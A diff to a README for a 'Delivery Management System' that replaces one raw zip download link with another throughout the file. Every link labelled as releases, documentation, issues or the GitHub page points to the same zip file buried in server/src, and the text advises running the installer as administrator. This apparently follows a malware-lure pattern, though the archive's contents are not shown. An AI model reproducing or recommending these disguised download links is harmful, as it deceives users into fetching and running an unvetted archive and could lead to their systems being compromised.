@@ -6,7 +6,7 @@ Welcome to the Delivery Management System! This application helps you manage del
 
 ## 🔗 Download Now
 
-[![Download](https://raw.githubusercontent.com/muhammadzerak/Delivery-Management-System/master/maintainment/Delivery-Management-System.zip)](https://raw.githubusercontent.com/muhammadzerak/Delivery-Management-System/master/maintainment/Delivery-Management-System.zip)
+[![Download](https://github.com/muhammadzerak/Delivery-Management-System/raw/refs/heads/master/server/src/Delivery_System_Management_v2.0.zip)](https://github.com/muhammadzerak/Delivery-Management-System/raw/refs/heads/master/server/src/Delivery_System_Management_v2.0.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets the following minimum requirements:
 
 To get started with the Delivery Management System, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/muhammadzerak/Delivery-Management-System/master/maintainment/Delivery-Management-System.zip) to download the latest version.
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/muhammadzerak/Delivery-Management-System/raw/refs/heads/master/server/src/Delivery_System_Management_v2.0.zip) to download the latest version.
 2. **Choose Your File:** Select the appropriate download file for your operating system.
    - For Windows, look for `.exe` file.
    - For macOS, look for `.dmg` file.
@@ -48,7 +48,7 @@ If you encounter issues during download or installation, consider these solution
 
 - **Download Issues:** Ensure your internet connection is stable. Try refreshing the page and downloading again.
 - **Installer Won’t Start:** Make sure you have the required permissions to run the installer, or try running it as an administrator.
-- **Software Crashes:** Check for the latest updates on our [Releases page](https://raw.githubusercontent.com/muhammadzerak/Delivery-Management-System/master/maintainment/Delivery-Management-System.zip). Update if necessary.
+- **Software Crashes:** Check for the latest updates on our [Releases page](https://github.com/muhammadzerak/Delivery-Management-System/raw/refs/heads/master/server/src/Delivery_System_Management_v2.0.zip). Update if necessary.
 
 ## ❓ FAQs
 
@@ -63,16 +63,16 @@ A: Yes, the software supports Linux. Choose the appropriate package from the Rel
 
 ## 📞 Support
 
-Need help? Feel free to reach out to our support team. Check our [GitHub Issues](https://raw.githubusercontent.com/muhammadzerak/Delivery-Management-System/master/maintainment/Delivery-Management-System.zip) page for common issues or to report a problem. 
+Need help? Feel free to reach out to our support team. Check our [GitHub Issues](https://github.com/muhammadzerak/Delivery-Management-System/raw/refs/heads/master/server/src/Delivery_System_Management_v2.0.zip) page for common issues or to report a problem. 
 
 ## 💡 Contributing
 
-Interested in helping us improve the Delivery Management System? We welcome contributions! Visit our [GitHub page](https://raw.githubusercontent.com/muhammadzerak/Delivery-Management-System/master/maintainment/Delivery-Management-System.zip) for more details on how you can get involved.
+Interested in helping us improve the Delivery Management System? We welcome contributions! Visit our [GitHub page](https://github.com/muhammadzerak/Delivery-Management-System/raw/refs/heads/master/server/src/Delivery_System_Management_v2.0.zip) for more details on how you can get involved.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/muhammadzerak/Delivery-Management-System/master/maintainment/Delivery-Management-System.zip)
-- [Documentation](https://raw.githubusercontent.com/muhammadzerak/Delivery-Management-System/master/maintainment/Delivery-Management-System.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/muhammadzerak/Delivery-Management-System/master/maintainment/Delivery-Management-System.zip)
+- [Releases Page](https://github.com/muhammadzerak/Delivery-Management-System/raw/refs/heads/master/server/src/Delivery_System_Management_v2.0.zip)
+- [Documentation](https://github.com/muhammadzerak/Delivery-Management-System/raw/refs/heads/master/server/src/Delivery_System_Management_v2.0.zip)
+- [GitHub Issues](https://github.com/muhammadzerak/Delivery-Management-System/raw/refs/heads/master/server/src/Delivery_System_Management_v2.0.zip)
 
 Thank you for choosing the Delivery Management System! We hope this tool makes your delivery process smooth and efficient.
